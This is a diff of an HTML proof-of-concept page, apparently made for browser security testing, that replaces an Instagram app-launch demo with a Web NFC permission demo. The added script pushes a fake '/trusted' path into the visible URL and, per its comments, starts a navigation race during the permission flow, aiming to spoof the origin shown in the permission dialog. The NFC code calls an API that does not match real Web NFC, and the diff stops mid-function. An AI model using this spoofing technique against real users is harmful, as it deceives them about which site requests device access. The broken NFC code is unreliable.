@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Instagram Open PoC</title>
+<title>Web NFC PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -10,7 +10,6 @@ body {
   margin: 0;
   font-family: -apple-system, BlinkMacSystemFont, system-ui;
   background: #f5f5f7;
-  text-align: center;
 }
 
 button {
@@ -25,17 +24,12 @@ button {
 #panel {
   display: none;
   max-width: 420px;
-  margin: 60px auto;
+  margin: 80px auto;
   background: #fff;
   padding: 24px;
   border-radius: 16px;
   box-shadow: 0 20px 60px rgba(0,0,0,.2);
-}
-
-video {
-  width: 100%;
-  border-radius: 12px;
-  margin-top: 12px;
+  text-align: center;
 }
 
 .notice {
@@ -48,57 +42,66 @@ video {
 
 <body>
 
-<div style="margin-top:60px;">
+<div style="text-align:center; margin-top:60px;">
   <button id="trigger">Start PoC</button>
 </div>
 
 <div id="panel">
-  <h2>Tap to Open Instagram</h2>
-  <p>Tap the button below to attempt to open Instagram.</p>
+  <h2>Request NFC Access</h2>
+  <p>Tap the button below to request NFC permission and read NFC tags.</p>
 
-  <button id="tap">Tap to Open Instagram</button>
-  <p id="status">Status: -</p>
-
-  <video id="video" autoplay playsinline></video>
+  <button onclick="readNfcTag()">Read NFC Tag</button>
+  <p id="output">NFC Data: -</p>
 
   <div class="notice">
-    Observe permission UI, app launch behavior, or unexpected navigation
+    Demo only — observe origin shown in permission dialog
   </div>
 </div>
 
 <script>
-const trigger = document.getElementById('trigger');
 const panel   = document.getElementById('panel');
-const tapBtn  = document.getElementById('tap');
-const status  = document.getElementById('status');
-const video   = document.getElementById('video');
+const trigger = document.getElementById('trigger');
+const output  = document.getElementById('output');
 
-let stream;
+function readNfcTag() {
+  if (!("NFC" in window)) {
+    alert("Web NFC API is not supported on this device or browser.");
+    return;
+  }
 
+  try {
+    // Request NFC device
+    const reader = new NfcReader();
+
+    reader.onreading = (event) => {
+      const tag = event.tag;
+      output.textContent = `NFC Tag Data: ${tag.serialNumber}`;
+    };
+
+    reader.onerror = (error) => {
+      output.textContent = 'Error reading NFC tag';
+    };
+
+    reader.start();
+    output.textContent = 'NFC reader started. Scan a tag.';
+  } catch (error) {
+    output.textContent = 'Permission denied or error accessing NFC';
+  }
+}
+
+/*
+ * Step 1:
+ * Manipulate visible URL to a trusted-looking path
+ */
 trigger.onclick = () => {
-  // Just display the panel without changing the history or URL
+  history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
 };
 
-tapBtn.onclick = () => {
-  // Try to open the Instagram app using its custom URL scheme
-  const appUrl = "instagram://";
-  const fallbackUrl = "https://www.instagram.com"; // Fallback to the web version
-
-  // Attempt to open Instagram app
-  const iframe = document.createElement("iframe");
-  iframe.style.display = "none";
-  iframe.src = appUrl;
-
-  document.body.appendChild(iframe);
-
-  // Fallback: If app is not installed, open Instagram website
-  setTimeout(() => {
-    document.body.removeChild(iframe);
-    window.location.href = fallbackUrl;
-  }, 2000); // Wait 2 seconds before redirecting to the web version
-};
-
+/*
+ * Step 2:
+ * Trigger a navigation race shortly after permission flow starts
+ */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
